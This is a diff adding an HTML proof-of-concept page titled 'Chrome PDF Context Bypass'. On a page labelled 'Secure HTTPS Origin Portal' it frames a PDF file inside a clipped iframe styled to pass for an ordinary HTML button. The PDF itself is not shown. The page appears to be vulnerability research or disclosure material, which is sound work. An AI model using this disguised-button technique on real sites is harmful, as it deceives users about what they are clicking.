@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Chrome PDF Context Bypass - PoC</title>
+    <style>
+        body { font-family: sans-serif; margin: 50px; background-color: #f4f6f9; }
+        .container { max-width: 500px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); text-align: center; }
+        
+        /* The Spoofed Button Wrapper */
+        .spoof-button-wrapper {
+            position: relative;
+            width: 205px;   
+            height: 57px;  
+            margin: 20px auto;
+            border-radius: 6px;
+            overflow: hidden; /* Clips default PDFium margins and scrollbars */
+            box-shadow: 0 2px 4px rgba(0,0,0,0.15);
+        }
+        .spoof-iframe {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            border: none;
+            overflow: hidden;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h3>Secure HTTPS Origin Portal</h3>
+    <p>Click the button below to test the bypass. It mimics a standard HTML button but is an embedded PDF canvas.</p>
+
+    <div class="spoof-button-wrapper">
+        <iframe src="button-poc.pdf" class="spoof-iframe" scrolling="no"></iframe>
+    </div>
+</div>
+</body>
+</html>
